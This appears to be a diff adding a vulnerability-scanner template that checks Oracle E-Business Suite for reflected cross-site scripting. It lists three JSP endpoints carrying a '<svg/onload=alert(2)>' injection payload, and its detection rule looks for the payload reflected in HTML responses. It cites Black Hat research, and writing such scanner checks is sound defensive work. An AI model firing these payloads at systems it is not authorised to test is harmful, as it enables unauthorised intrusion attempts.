@@ -1,0 +1,31 @@
+id: oracle-ebs-xss
+info:
+  name: Oracle EBS XSS
+  risk: Medium
+  confidence: Tentative
+
+params:
+  - root: "{{.BaseURL}}"
+
+variables:
+  - endpoint: |
+      jtfLOVInProcess.jsp?AAA=AAAAAAAAAA'"><svg/onload=alert(2)>
+      oksAutoRenewalHelp.jsp?thanks='"><svg/onload=alert(2)>
+      ieuiMeetingErrorDisplay.jsp?ErrCode='"><svg/onload=alert(2)>
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}/OA_HTML/{{.endpoint}}
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("resHeaders", "text/html") && StringSearch("body", "<svg/onload=alert(2)>")
+
+references:
+  - links:
+      - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite-wp-4.pdf
+      - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite.pdf
+      - http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf
